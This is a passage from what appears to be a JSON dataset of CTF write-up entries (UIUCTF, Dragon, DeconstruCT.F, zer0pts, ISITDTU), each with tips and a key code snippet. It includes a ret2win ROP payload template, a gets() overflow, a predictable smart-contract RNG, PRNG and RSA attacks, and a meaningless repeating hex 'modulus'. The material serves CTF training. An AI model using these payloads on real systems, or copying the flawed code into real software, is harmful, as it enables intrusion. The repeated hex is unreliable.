        "key": "```cpp\nvoid makebet(name user) {\n    // Assume this function is part of a contract\n    // Pseudo-random number generation\n    auto seed = current_time_point().sec_since_epoch();\n    uint64_t random_number = (seed ^ user.value) % 5; // Vulnerable to prediction\n\n    // Game logic\n    if (random_number == 0) {\n        // User wins\n        users_table.modify(user_itr, _self, [&](auto& row) {\n            row.wins += 1;\n        });\n    } else {\n        // User loses\n        users_table.modify(user_itr, _self, [&](auto& row) {\n            row.losses += 1;\n        });\n    }\n}\n```"
    },
    {
        "name": "easy math 1",
        "write_up": "dataset/raw/easy math 1.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "For challenges that involve solving a high volume of automated tasks or dynamic input/output operations within a shell or programmatic session, the Python `pexpect` library can be utilized effectively to automate the sending and receiving of data. This approach is particularly useful in scenarios where direct interaction with a server or service, such as SSH, is required to solve the problem. Through the use of `spawn()`, `expect()`, and `sendline()` functions, `pexpect` allows for the automation of interactions that would otherwise require manual input and output monitoring. An example snippet for using `pexpect` to automate the solving of math problems via SSH could look like this:\n\n```python\nimport pexpect\n\nchild = pexpect.spawn('ssh ctf@easy-math.chal.uiuc.tf')\nchild.expect('ctf@easy-math.chal.uiuc.tf\\'s password:')\nchild.sendline('ctf')\n# Further commands to interact with the challenge.\n```",
            "When faced with the task of programmatically solving questions or executing commands where the output of each command determines the input of the subsequent command, consider dynamically parsing command output and computing responses on-the-fly. This strategy ensures efficiency and scalability in solving challenges which require a large number of sequential and dependent steps. The core concept involves capturing command output, processing it to determine the correct response, and then supplying that response as input for the next challenge step. This approach can be generalized and applied to a wide range of CTF challenges, especially those requiring interaction with a shell or custom protocols. A pseudocode example for dynamically solving math problems based on captured output could look as follows:\n\n```python\n# Assuming 'child' is a pexpect.spawn object connected to the challenge\nfor question in range(10000):\n    child.expect('Question \\d+: (\\d+) \\* (\\d+) =')\n    a, b = map(int, child.match.groups())\n    answer = a * b\n    child.sendline(str(answer))\n# Proceed to capture the flag or next set of instructions.\n```"
        ],
        "key": "```c\nint main() {  \n setreuid(geteuid(), getuid());  \n setvbuf(stdout, NULL, _IONBF, 0);\n\n // ...\n\n if (take_test()) {  \n   printf(\"You have failed the test.\\n\");  \n   return 1;  \n }\n\n setreuid(getuid(), getuid());  \n system(\"cat /home/ctf/flag\");  \n return 0;  \n}  \n```"
    },
    {
        "name": "Easy NFT",
        "write_up": "dataset/raw/Easy NFT.md",
        "type": "The challenge described in the write-up is of the **forensics** type.",
        "competition": [
            "Dragon/2021",
            "https://ctftime.org/event/1457/tasks/"
        ],
        "score": 354,
        "max_score": 471,
        "difficulty": 0.7515923566878981,
        "knowledge": [
            "When encountering pcap files that involve netlink messages, parsing can be effectively handled using the combination of `tshark` for initial extraction and Go programming language with libraries such as `github.com/mdlayher/netlink` for decoding the messages. This approach is useful for extracting structured data from pcap files for analysis. The first step involves using `tshark` to convert the pcap to a hexadecimal dump, followed by a Go program to parse these hex dumps into human-readable netlink messages. This method is applicable in scenarios involving network diagnostics, forensics, or reverse engineering where netlink communication is present.\n   \n   Sample command to extract hex dumps with `tshark`: \n   ```\n   tshark -r input.pcap -x | grep -v \"0000\" | awk -F \"  \" '{print $2}' | tr -d ' ' | perl -00 -lpe 'tr/\\n//d' | grep -Ev '^\\s*' > output_netlink.dump\n   ```",
            "For challenges that involve analyzing netfilter (nftables) netlink messages, identifying message and attribute types is crucial for understanding the captured data's semantics. This can be accomplished by mapping the types to their corresponding names, based on the Linux kernel's netfilter and nftables documentation or source code. This technique allows for a deeper analysis of firewall configurations, rulesets, or other netfilter-related settings captured in pcap files. This knowledge is particularly useful when dealing with network security analysis or diagnostics challenges where understanding the behavior of netfilter rules is critical.\n\n   Example to map message type to its name in Go:\n   ```go\n   var messageTypeNames = []string{\"NFT_MSG_NEWTABLE\", \"NFT_MSG_GETTABLE\", ...};\n\n   // Usage in code to print friendly names\n   fmt.Printf(\"%s\\n\", messageTypeNames[header.MessageType])\n   ```"
        ],
        "key": "```go  \npackage main\n\nimport (  \n\t\"bufio\"  \n\t\"encoding/binary\"  \n\t\"encoding/hex\"  \n\t\"fmt\"  \n\t\"os\"\n\n\t\"github.com/mdlayher/netlink\"  \n)\n\nfunc main() {  \n\tf, err := os.Open(\"hex_netlink.dump\")  \n\tif err != nil {  \n\t\tpanic(err)  \n\t}  \n\tdefer f.Close()\n\n\tscanner := bufio.NewScanner(f)  \n\tvar messages []netlink.Message\n\n\tfor scanner.Scan() {  \n\t\tpacketHex := scanner.Text()\n\n\t\td, err := hex.DecodeString(packetHex)  \n\t\tif err != nil {  \n\t\t\tpanic(err)  \n\t\t}\n\n\t\t// packet may contains multiple messages, so split on size  \n       // https://github.com/mdlayher/netlink/blob/v1.4.1/message.go#L234  \n\t\tfor {  \n\t\t\tsize := binary.LittleEndian.Uint32(d[:4])\n\n\t\t\tpacket := d  \n\t\t\tif len(d) > int(size) {  \n\t\t\t\tpacket = d[:size]  \n\t\t\t}  \n\t\t\td = d[size:]\n\n\t\t\tmsg := netlink.Message{}  \n\t\t\tif err := msg.UnmarshalBinary(packet); err != nil {  \n\t\t\t\tpanic(fmt.Errorf(\"failed to unmarshal: %v - packet: %x\", err, d))  \n\t\t\t}\n\n\t\t\tmessages = append(messages, msg)  \n\t\t\tif len(d) == 0 {  \n\t\t\t\tbreak  \n\t\t\t}  \n\t\t}  \n\t}\n\n\tfmt.Printf(\"Parsed %d messages\\n\", len(messages))  \n\tfor _, m := range messages {  \n\t\tfmt.Printf(\"%#v\\n\", m)  \n\t}  \n}  \n```"
    },
    {
        "name": "Easy Peasy",
        "write_up": "dataset/raw/Easy Peasy.md",
        "type": "crypto",
        "competition": [
            "DeconstruCT.F/2023",
            "https://ctftime.org/event/2042/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "In challenges dealing with buffer overflow vulnerabilities, especially with binaries compiled for the AMD64 architecture, identifying the offset necessary to overwrite the return address is crucial. This can be done using tools like `cyclic` in GDB-enhanced with `pwndbg`. This step is pivotal before constructing the payload for a `ret2win` scenario. For instance, after crashing the program with a cyclic pattern, use `cyclic -l` with the address the program crashed on to find the offset. In this context, the offset was found at 40 bytes.",
            "When dealing with Return Oriented Programming (ROP) in binaries where NX bit is disabled, and there's no PIE, it's useful to first look for a `ret` gadget and then chain it with the functions necessary to exploit the binary, specifically leading to the `win` function to execute arbitrary code. This approach helps bypass potential stack alignment issues that might prevent the exploit from working as intended. An additional step to ensure reliability, especially in remote exploitation scenarios, might involve calling another function (like `main`) after the `win` function to stabilize control flow and ensure the flag is printed out. Example payload template: `b\"A\"*<offset> + p64(<ret_gadget>) + p64(<win_function>) + p64(<optional_continuation>)`.\n\nSample exploit segment:\n```python\n# Assuming offset is 40, elf is the ELF binary loaded with pwntools, and ret is found with `asm('ret')`\npayload = b\"A\"*40 + p64(ret) + p64(elf.sym.win) + p64(elf.sym.main)\n```"
        ],
        "key": "```c\nvoid vuln(void)\n{  \n char local_28 [32];\n gets(local_28);  \n return;  \n}\n```"
    },
    {
        "name": "easy pseudo random",
        "write_up": "dataset/raw/easy pseudo random.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2021",
            "https://ctftime.org/event/1256/tasks/"
        ],
        "score": 167,
        "max_score": 392,
        "difficulty": 0.4260204081632653,
        "knowledge": [
            "To break a Blum Blum Shub-like pseudorandom number generator (PRNG) where partial information about the first two outputs is known, one can utilize the LLL algorithm for lattice basis reduction. This approach is effective when manipulating the equation to isolate unknown parts and form a lattice that enables solving for these unknown parts. Such manipulation includes forming a matrix that represents the problem and adjusting its scale to conform to conditions like Minkowski's Bound. This technique works under the condition that enough information is provided to form a solvable lattice, and it's applicable in scenarios where compromising PRNGs is necessary to decrypt information.\n   \n   Example step: Adjusting the scale involves setting variables \\(A = \\frac{p}{X}\\), \\(B = p\\), and \\(C = \\frac{p}{X^2}\\) in the matrix that defines the lattice, ensuring the determinant and norm satisfy specific bounds for the LLL algorithm to effectively find a solution.",
            "After successfully compromising the PRNG and determining the missing parts of its initial outputs, it's straightforward to sequentially generate the subsequent outputs. These outputs can then be used to decrypt messages that were encrypted by XOR-ing them with the PRNG outputs. This decryption approach is particularly relevant when dealing with cryptographic challenges where a secret message, such as a flag, is encrypted in this manner. The knowledge applies directly to scenarios where the attacker has partial knowledge of the initial PRNG state and aims to fully reconstruct it to decrypt the hidden message.\n\n   Example payload (concept): Given the recovered initial states `x0` and `x1`, it's possible to perform the decryption by reversing the XOR operation: `decrypted_message = encrypted_message ^^ int(v)`, where `v` is iteratively updated using the PRNG update function `F(v) = v^2 + b` over `\\(\\mathbb{Z}/p\\mathbb{Z}\\)`."
        ],
        "key": "```python  \nfrom Crypto.Util.number import*  \nfrom flag import flag\n\nnbits = 256  \np = random_prime(1 << nbits)  \nFp = Zmod(p)  \nP.<v> = PolynomialRing(Fp)\n\nb = randrange(p)  \nd = 2  \nF = v^2 + b\n\nv0 = randrange(p)  \nv1 = F(v0)\n\nk = ceil(nbits * (d / (d + 1)))  \nw0 = (v0 >> (nbits - k))  \nw1 = (v1 >> (nbits - k))\n\n# encrypt  \nm = bytes_to_long(flag)  \nv = v1  \nfor i in range(5):  \n   v = F(v)  \n   m ^^= int(v)\n\nprint(f\"p = {p}\")  \nprint(f\"b = {b}\")  \nprint(f\"m = {m}\")  \nprint(f\"w0 = {w0}\")  \nprint(f\"w1 = {w1}\")  \n```"
    },
    {
        "name": "Easy RSA 1",
        "write_up": "dataset/raw/Easy RSA 1.md",
        "type": "crypto",
        "competition": [
            "ISITDTU/2019/Quals",
            "https://ctftime.org/event/803/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "When the RSA challenge provides an unusually large public exponent (`e`) that is almost as large as the modulus (`n`), the Boneh-Durfee attack can be effective in recovering the private key `d`. The condition here is that `e` is significantly larger than typical values (e.g., 1023 bits for `e` vs. 1024 bits for `n`).",
            "Efficient implementations of advanced attacks, such as the Boneh-Durfee attack, are available and can sometimes allow for the recovery of private keys in less than a second when certain conditions are met. Tools or scripts that implement these cryptographic attacks can significantly ease the process of breaking RSA when its parameters meet specific criteria. \n\nSample payload for RSA decryption after obtaining `d` (not specific to Boneh-Durfee): \n\n```python\n# Assuming RSA parameters `n`, `e`, and `c` are given, and `d` has been found.\ndef decrypt_rsa(c, d, n):\n    return pow(c, d, n)\n\n# Decrypt the ciphertext `c` using the private key `d` and modulus `n` to get the plaintext\nplaintext = decrypt_rsa(ciphertext, d, n)\nprint(\"Decrypted message:\", plaintext)\n```"
        ],
        "key": "```python\n# config.py\nn = 0x00c3d3e3a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7